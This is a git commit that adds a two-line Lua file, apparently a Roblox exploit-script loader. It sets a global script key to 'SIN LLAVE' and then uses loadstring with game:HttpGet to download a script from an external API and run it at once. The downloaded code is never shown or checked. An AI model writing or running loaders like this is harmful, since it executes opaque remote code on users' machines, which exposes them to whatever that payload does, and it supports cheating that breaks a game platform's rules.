b9c6dbf2a44284764cafebf488bb5fe4e3011d75
carlossano888-create <carlossano888@gmail.com>
2026-08-15 05:33:44 -0600

    Crear yisus.lua

---
+++ yisus.lua
@@ -0,0 +1,2 @@
+getgenv().SCRIPT_KEY = "SIN LLAVE"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/00790b079eea9ad8fed0df8833bfc6209d71e5089ef2d5455b4892759ee57086/download"))()
